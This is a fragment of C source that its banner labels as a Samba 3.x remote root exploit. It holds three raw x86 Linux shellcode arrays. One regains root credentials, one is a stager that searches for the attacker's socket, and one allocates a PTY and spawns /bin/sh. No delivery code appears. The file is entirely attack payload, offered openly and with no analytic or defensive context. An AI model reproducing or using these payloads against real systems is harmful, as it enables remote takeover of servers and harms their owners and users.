/*
 .oooooo..o                              .o8                 oooo       ooooo ooooo ooooo
d8P'    `Y8                             "888                 `888       `888' `888' `888'
Y88bo.       .oooo.   ooo. .oo.  .oo.    888oooo.   .oooo.    888        888   888   888
 `"Y8888o.  `P  )88b  `888P"Y88bP"Y88b   d88' `88b `P  )88b   888        888   888   888
     `"Y88b  .oP"888   888   888   888   888   888  .oP"888   888        888   888   888
oo     .d8P d8(  888   888   888   888   888   888 d8(  888   888        888   888   888
8""88888P'  `Y888""8o o888o o888o o888o  `Y8bod8P' `Y888""8o o888o      o888o o888o o888o

  sambal III: samba 3.x.x remote root exploit                  by eSDee (esdee@netric.org)

*/

unsigned int linux_x86_findsck_tag = 0xbade5dee;

unsigned char
linux_x86_regain_credentials[] =

        /* Equivalent of gain_root_privilege() */

        "\x31\xc0\xb0\xa4\x31\xd2\x31\xdb"
        "\x31\xc9\x4a\xcd\x80\x31\xc0\xb0"
        "\xd0\x4b\x89\xda\xcd\x80\x31\xc0"
        "\xb0\x46\x31\xdb\xcd\x80\x31\xc0"
        "\xb0\x17\xcd\x80\x31\xc0\xb0\x2e"
        "\xcd\x80";


unsigned char
linux_x86_findsck[] =

        /* Simple recv(fd++, MSG_DONTWAIT stager shellcode */

        "\x31\xc9\x31\xdb\x6a\x40\x68\x00"
        "\x04\x00\x00\x89\xe2\x81\xea\x00"
        "\x08\x00\x00\x52\x51\x89\xe1\x31"
        "\xc0\xb3\x0a\xb0\x66\xcd\x80\xfe"
        "\x04\x24\x81\x3a\xee\x5d\xde\xba"
        "\x75\xed\x80\xc2\x04\x8b\x1c\x24"
        "\x4b\xff\xe2";

unsigned char 
linux_x86_findsck_pty_alloc[] = 
        
        /* PTY alloc shellcode */

        "\x31\xc0\x31\xd2\x68\x2e"
        "\x65\x73\x73"

        "\x89\xe1\xb2\x04\xb0\x04\xcd\x80"
        "\x89\xdf\x31\xd2\x52\x68\x70\x74"
        "\x6d\x78\x68\x64\x65\x76\x2f\x68"
        "\x2f\x2f\x2f\x2f\x31\xc9\xb1\x02"
        "\x89\xe3\xb0\x05\xcd\x80\x89\xc6"
        "\x52\x89\xe2\xb9\x31\x54\x04\x40"
        "\x89\xf3\xb0\x36\xcd\x80\x89\xe2"
        "\xb9\x30\x54\x04\x80\xb0\x36\xcd"
        "\x80\x59\x83\xc1\x30\xc1\xe1\x18"
        "\xba\x01\x74\x73\x2f\xc1\xea\x08"
        "\x01\xca\x31\xc9\x51\x52\x31\xd2"
        "\x68\x65\x76\x2f\x70\x68\x2f\x2f"
        "\x2f\x64\xb1\x02\x89\xe3\xb0\x05"
        "\xcd\x80\x89\xc2\xb0\x02\xcd\x80"
        "\x31\xc9\x39\xc8\x75\x4c\x31\xc0"
        "\xb0\x42\xcd\x80\xb1\x03\x89\xd3"
        "\x31\xc0\xb0\x3f\x49\xcd\x80\x41"
        "\xe2\xf6\x89\xd3\x31\xc0\xb0\x06"
        "\xcd\x80\x89\xf3\x31\xc0\xb0\x06"
        "\xcd\x80\x89\xfb\x31\xc0\xb0\x06"
        "\xcd\x80\x31\xc0\x50\x68\x2f\x2f"
        "\x73\x68\x68\x2f\x62\x69\x6e\x89"
        "\xe3\x50\x53\x89\xe1\x31\xd2\x31"
        "\xc0\xb0\x0b\xcd\x80\x31\xc0\x40"
        "\xcd\x80\x89\xd3\x31\xc0\xb0\x06"
        "\xcd\x80\x83\xec\x50\x31\xc0\x31"
        "\xdb\x31\xc9\x89\xf9\x43\xd3\xe3"
        "\x09\xd8\x89\xf1\x31\xdb\x43\xd3"
        "\xe3\x09\xd8\x50\x89\xda\x89\xcb"
        "\x43\x89\xe1\x52\x57\x56\x31\xff"
        "\x31\xf6\x31\xd2\x31\xc0\xb0\x8e"
        "\xcd\x80\x5e\x5f\x5b\x58\x21\xd8"
        "\x31\xdb\x39\xc3\x75\x1d\xb2\x50"
        "\x89\xe1\x89\xfb\x31\xc0\xb0\x03"
        "\xcd\x80\x83\xf8\x01\x7c\x27\x89"
        "\xc2\x89\xf3\x31\xc0\xb0\x04\xcd"
        "\x80\xeb\xaa\xb2\x50\x89\xe1\x89"
        "\xf3\x31\xc0\xb0\x03\xcd\x80\x83"
        "\xf8\x01\x7c\x0a\x89\xc2\x89\xfb"
        "\xb0\x04\xcd\x80\xeb\x8f\x31\xc0"
        "\x40\xcd\x80";

